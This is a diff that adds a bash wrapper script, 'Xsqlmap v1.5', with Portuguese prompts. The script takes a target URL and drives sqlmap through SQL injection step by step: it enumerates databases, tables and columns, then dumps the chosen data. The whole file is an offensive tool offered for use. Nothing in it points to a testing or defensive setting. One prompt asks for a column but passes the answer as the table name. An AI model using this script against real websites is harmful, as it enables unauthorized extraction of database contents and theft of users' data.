@@ -1,0 +1,17 @@
+#!/bin/bash
+cd /root/.sqlmap
+echo "||=================================================================||"
+echo "||======                    Xsqlmap v1.5                     ======||"
+echo "||=================================================================||"
+echo "Digite URL:"
+read url
+./sqlmap.py -u $url --dbs
+echo "Extrair qual banco de dados?"
+read banco
+./sqlmap.py -u $url --dbs -D $banco --tables
+echo "Extrair qual coluna?"
+read coluna
+./sqlmap.py -u $url --dbs -D $banco -T $coluna --columns
+echo "Extrair quais dados (use "," para multiplas escolhas)?"
+read dados
+./sqlmap.py -u $url --dbs -D $banco -T $coluna -C $dados --dump
